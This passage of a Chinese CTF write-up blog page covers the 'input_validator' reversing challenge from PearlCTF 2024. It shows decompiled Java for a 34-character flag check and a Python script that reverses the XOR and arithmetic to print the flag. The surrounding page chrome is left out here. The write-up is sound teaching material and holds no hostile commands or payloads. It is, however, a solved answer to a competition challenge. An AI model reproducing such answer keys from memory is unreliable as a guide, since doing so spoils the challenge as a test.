class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Source code is decompiled from a .class file using FernFlower decompiler.</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">input_validator</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_LEN</span> <span class="operator">=</span> <span class="number">34</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">input_validator</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">validate</span><span class="params">(String var0, String var1)</span> &#123;</span><br><span class="line">      <span class="type">int</span>[] var2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">34</span>];</span><br><span class="line">      <span class="type">int</span>[] var3 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1102</span>, <span class="number">1067</span>, <span class="number">1032</span>, <span class="number">1562</span>, <span class="number">1612</span>, <span class="number">1257</span>, <span class="number">1562</span>, <span class="number">1067</span>, <span class="number">1012</span>, <span class="number">902</span>, <span class="number">882</span>, <span class="number">1397</span>, <span class="number">1472</span>, <span class="number">1312</span>, <span class="number">1442</span>, <span class="number">1582</span>, <span class="number">1067</span>, <span class="number">1263</span>, <span class="number">1363</span>, <span class="number">1413</span>, <span class="number">1379</span>, <span class="number">1311</span>, <span class="number">1187</span>, <span class="number">1285</span>, <span class="number">1217</span>, <span class="number">1313</span>, <span class="number">1297</span>, <span class="number">1431</span>, <span class="number">1137</span>, <span class="number">1273</span>, <span class="number">1161</span>, <span class="number">1339</span>, <span class="number">1267</span>, <span class="number">1427</span>&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> var4;</span><br><span class="line">      <span class="keyword">for</span>(var4 = <span class="number">0</span>; var4 &lt; <span class="number">34</span>; ++var4) &#123;</span><br><span class="line">         var2[var4] = var0.charAt(var4) ^ var1.charAt(var4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(var4 = <span class="number">0</span>; var4 &lt; <span class="number">34</span>; ++var4) &#123;</span><br><span class="line">         var2[var4] -= var1.charAt(<span class="number">33</span> - var4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span>[] var6 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">34</span>];</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> var5;</span><br><span class="line">      <span class="keyword">for</span>(var5 = <span class="number">0</span>; var5 &lt; <span class="number">17</span>; ++var5) &#123;</span><br><span class="line">         var6[var5] = var2[<span class="number">1</span> + var5 * <span class="number">2</span>] * <span class="number">5</span>;</span><br><span class="line">         var6[var5 + <span class="number">17</span>] = var2[var5 * <span class="number">2</span>] * <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(var5 = <span class="number">0</span>; var5 &lt; <span class="number">34</span>; ++var5) &#123;</span><br><span class="line">         var6[var5] += <span class="number">1337</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(var5 = <span class="number">0</span>; var5 &lt; <span class="number">34</span>; ++var5) &#123;</span><br><span class="line">         <span class="keyword">if</span> (var6[var5] != var3[var5]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] var0)</span> &#123;</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;oF/M5BK_U&lt;rqxCf8zWCPC(RK,/B&#x27;v3uARD&quot;</span>;</span><br><span class="line">      System.out.print(<span class="string">&quot;Enter input: &quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">var3</span> <span class="operator">=</span> var1.nextLine();</span><br><span class="line">      <span class="keyword">if</span> (var3.length() != <span class="number">34</span>) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Input length does not match!&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (validate(<span class="keyword">new</span> <span class="title class_">String</span>(var3), var2)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Correct&quot;</span>);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">1102</span>, <span class="number">1067</span>, <span class="number">1032</span>, <span class="number">1562</span>, <span class="number">1612</span>, <span class="number">1257</span>, <span class="number">1562</span>, <span class="number">1067</span>, <span class="number">1012</span>, <span class="number">902</span>, <span class="number">882</span>, <span class="number">1397</span>, <span class="number">1472</span>, <span class="number">1312</span>, <span class="number">1442</span>, <span class="number">1582</span>, <span class="number">1067</span>, <span class="number">1263</span>, <span class="number">1363</span>, <span class="number">1413</span>, <span class="number">1379</span>, <span class="number">1311</span>, <span class="number">1187</span>, <span class="number">1285</span>, <span class="number">1217</span>, <span class="number">1313</span>, <span class="number">1297</span>, <span class="number">1431</span>, <span class="number">1137</span>, <span class="number">1273</span>, <span class="number">1161</span>, <span class="number">1339</span>, <span class="number">1267</span>, <span class="number">1427</span>]</span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&quot;oF/M5BK_U&lt;rqxCf8zWCPC(RK,/B&#x27;v3uARD&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    c[i] -= <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">c1 = [<span class="string">&#x27;&#x27;</span>] * <span class="number">34</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    c1[i * <span class="number">2</span> + <span class="number">1</span>] = <span class="built_in">int</span>(c[i] / <span class="number">5</span>)</span><br><span class="line">    c1[i * <span class="number">2</span>] = <span class="built_in">int</span>(c[i + <span class="number">17</span>] / <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    c1[i] += key[<span class="number">33</span> - i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    c1[i] ^= key[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(c1[i]), end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</article>
+    
+    
+
+<ul class="trm-post-copyright">
+    <li class="trm-post-copyright-author">
+        <strong>本文作者：</strong>
+        JackGDN
+    </li>
+    <li class="trm-post-copyright-link">
+        <strong>本文链接：</strong>
+        <a id="original-link" href="https://jackgdn.github.io/2024/03/10/Pearl2024/" title="PearlCTF 2024 WP">https://jackgdn.github.io/2024/03/10/Pearl2024/</a>
+    </li>
+    <li class="trm-post-copyright-license">
+        <strong>版权声明：</strong>
+        本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-ND 4.0 ">CC BY-NC-ND 4.0</a> 许可协议。
+    </li>
+</ul>
+
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/03/07/20240307/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">07</div>
+                    <div class="trm-cover-month">2024/03</div>
+                </div>
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/Python-%E7%BC%96%E7%A8%8B%E5%AF%BC%E8%AE%BA%E7%AC%94%E8%AE%B0/">
+                    Python 编程导论笔记
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/03/07/20240307/" class="trm-anima-link">
+                    2023.3.7 第二次课
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/03/07</li>
+                <li>17:11</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+    <div id="giscus-wrap" class="trm-card trm-scroll-animation comment-container"></div>
+<script data-swup-reload-script>
+    function loadGiscus() {
+        let nowTheme = document.documentElement.classList.contains('dark') ? 'transparent_dark' : 'light'
+        const config = {
+            src: 'https://giscus.app/client.js',
+            "data-repo": 'jackgdn/jackgdn.github.io',
+            "data-repo-id": 'R_kgDOLYEWwg',
+            "data-category": 'Announcements',
+            "data-category-id": 'DIC_kwDOLYEWws4CdvZ-',
+            "data-mapping": 'title',
+            "data-reactions-enabled": '1',
+            "data-emit-metadata": '0',
+            "data-theme": nowTheme,
+            "data-lang": 'zh-CN',
+            crossorigin: "anonymous",
+            async: true
+        }
+        let ele = document.createElement('script')
+        for (let key in config) {
+            ele.setAttribute(key, config[key])
+        }
+        document.getElementById('giscus-wrap').insertAdjacentElement('afterbegin', ele)
+    }
+
+    function changeGiscusTheme() {
+        let theme = document.documentElement.classList.contains('dark') ? 'transparent_dark' : 'light'
+
+        function sendMessage(message) {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (!iframe) return;
+            iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+        }
+
+        sendMessage({
+            setConfig: {
+                theme: theme
+            }
+        });
+    }
+
+    loadGiscus();
+</script>
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2024- 2024</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">jack_gdn</span>
+        </div>
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1
+            </span>
+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                主题 - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.1.10
+            </span>
+        </div>
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+    
+        <div class="trm-footer-item">
+            Nice Day ;-)
+        </div>
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        目录导航
+				<span id="post-toc-top">
+					置顶
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title="b4by_jail"><a rel="nofollow" class="trm-toc-link" href="#b4by-jail"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">b4by_jail</span></a></li><li class="trm-toc-item trm-toc-level-1" title="TooRandom"><a rel="nofollow" class="trm-toc-link" href="#TooRandom"><span class="trm-toc-number">2.</span> <span class="trm-toc-text">TooRandom</span></a></li><li class="trm-toc-item trm-toc-level-1" title="input_validator"><a rel="nofollow" class="trm-toc-link" href="#input-validator"><span class="trm-toc-number">3.</span> <span class="trm-toc-text">input_validator</span></a></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+    <div class="trm-search-popup">
+        <div class="trm-search-wrapper">
+            <div class="form trm-search-form">
+                <div class="trm-search-input-icon">
+                    <i class="iconfont fas fa-search"></i>
+                </div>
+                <input class="trm-search-input" type="text" placeholder="搜索文章...">
+                <div class="trm-search-btn-close">
+                    <i class="iconfont fas fa-times"></i>
+                </div>
+            </div>
+            <div class="trm-search-result-container">
+                <div class="trm-search-empty">
+                    请输入关键词进行搜索
+                </div>
+            </div>
+            <div class="trm-search-footer">
+                <div class="trm-search-stats"></div>
+                <ul class="trm-search-commands">
+                    <li>
+                        <kbd class="command-palette-commands-key">
+                            <svg width="15" height="15" aria-label="Escape key" role="img">
+                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
+                                    stroke-width="1.2">
+                                    <path
+                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
+                                    </path>
+                                </g>
+                            </svg>
+                        </kbd>
+                        <span class="command-palette-Label">to close</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.1.10"></script>
+    
+
+    
+        
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+
+        <script src="/js/plugins/local_search.js?v=2.1.10"></script>
+    
+
+    <!-- 数学公式 -->
+    
+        
+<script src="https://unpkg.com/katex@latest/dist/katex.min.js" data-swup-reload-script></script>
+
+        
+            
+<script src="https://unpkg.com/katex@latest/dist/contrib/copy-tex.min.js" data-swup-reload-script></script>
+
+        
+        
+<script src="https://unpkg.com/katex@latest/dist/contrib/auto-render.min.js" data-swup-reload-script></script>
+
+        <script data-swup-reload-script>
+              window.renderMathInElement(document.body, {
+                delimiters: [
+                    { left: '$$', right: '$$', display: true },
+                    { left: '$', right: '$', display: false },
+                    { left: '\\(', right: '\\)', display: false },
+                    { left: '\\[', right: '\\]', display: true },
+                ],
+                ...{},
+            })
+        </script>
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+
+
+<!-- CDN -->
+
+
+    
+
+    
+
+    
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+
+
+<script id="async-script" src="/js/main.js?v=2.1.10"></script>
+
+</body>
+
+</html>
